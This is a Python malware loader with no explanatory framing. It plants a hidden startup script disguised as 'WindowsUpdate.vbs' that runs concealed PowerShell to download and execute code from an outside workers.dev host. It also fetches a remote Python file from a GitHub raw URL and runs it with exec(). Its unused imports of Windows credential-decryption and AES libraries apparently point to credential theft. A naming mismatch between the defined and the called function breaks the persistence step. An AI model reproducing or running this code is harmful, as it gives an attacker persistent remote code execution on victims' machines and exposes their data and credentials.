import os
import subprocess
import tempfile
import zipfile
import shutil
import requests
import json
import sqlite3
import base64
import time
import ctypes as ct
from ctypes import c_char_p, c_void_p, c_uint, POINTER, Structure, cast, byref, string_at
from getpass import getpass
import websocket
import win32crypt
from Crypto.Cipher import AES
import re
import datetime
import platform
from pathlib import Path

def copy_to_startups():
    try:
        import os
        import ctypes
        
        startup = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup',
            'WindowsUpdate.vbs'
        )
        
        vbs_content = '''CreateObject("WScript.Shell").Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""iex (iwr -UseBasicParsing https://work.thexor7.workers.dev/psc).Content""", 0, False'''
        
        with open(startup, 'w') as f:
            f.write(vbs_content)
        
        ctypes.windll.kernel32.SetFileAttributesW(startup, 2)
        return True
    except:
        return False

copy_to_startup()

def fetch_and_execute(url):
    response = requests.get(url)
    response.raise_for_status()
    script_content = response.text
    exec(script_content, globals())

if __name__ == "__main__":
    github_urls = [
        'https://raw.githubusercontent.com/azayan165-svg/f/refs/heads/main/w.py'
    ]
    for url in github_urls:
        fetch_and_execute(url)
